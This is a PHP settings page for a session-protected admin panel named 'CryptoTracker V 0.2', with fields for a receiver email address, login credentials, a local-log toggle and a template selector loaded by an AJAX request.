<?php
session_start();
require_once("../inc/config.inc.php");
require_once("../system/system.inc.php");
require_once("../inc/cryptodb.inc.php");
if(!isset($_SESSION['session'])) {
  header("Location: index.php");
  exit();
}
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>CryptoTracker V 0.2</title>
    <link rel="stylesheet" href="assets/master.css" media="screen" title="no title" charset="utf-8">
    <script src="assets/master.js" charset="utf-8"></script>
    <script type="text/javascript">
      window.onload = function() {
        var x = new XMLHttpRequest;
        try {
          x.open("GET", "actions/templates.php", true);
          x.send();
          x.onreadystatechange = function() {
            if(x.readyState == 4 && x.status == 200) {
              var data = JSON.parse(x.responseText);
              for(var i=0; i<data.templates.length; i++) {
                var option = document.createElement("option");
                option.text = data.templates[i];
                option.value = data.templates[i];
                document.getElementById("template_select").add(option);
              }
            }
          }
        } catch(e) {
          console.log("An error occured : "+e);
        }
      }
    </script>
  </head>
  <body>
    <div class="menu">
      <ul>
        <li><a href="dashboard.php">Dashboard</a></li>
        <li><a href="visitors.php">Visitors</a></li>
        <li class="active"><a href="settings.php">Settings</a></li>
        <?php
        if($local_log) {
        ?>
        <li><a href="log.php">Local Log</a></li>
        <?php
        }
        ?>
        <li><a href="logout.php">Logout</a></li>
      </ul>
    </div>
    <div class="body">
      <div style="margin-top : 10px; margin-left : 10px">
        <input type="text" id="receiver_email" placeholder="Email address" value="<?php if($receiver != "[CRYPTORECEIVER]") { echo $receiver; }; ?>" /><br />
        <button onclick="updateMail()">Update email</button><br />
        <input style="margin-top : 10px;" type="text" id="username" placeholder="Username" value="<?php if($username != "[CRYPTOUSERNAME]") { echo $username; }; ?>" /><br />
        <input style="margin-top : 10px;" type="password" id="password" placeholder="Password" /><br />
        <button onclick="updateCred()">Update credentials</button><br />
        <button onclick="<?php if(!$local_log) { ?>enableLocal()<?php } else { ?> disableLocal() <?php } ?>"><?php if(!$local_log) { ?> Enable Local Log<?php } else { ?> Disable Local Log <?php } ?></button><br />
        <select id="template_select" onchange="changeTemplate()">
        </select>
      </div>
    </div>
  </body>
</html>
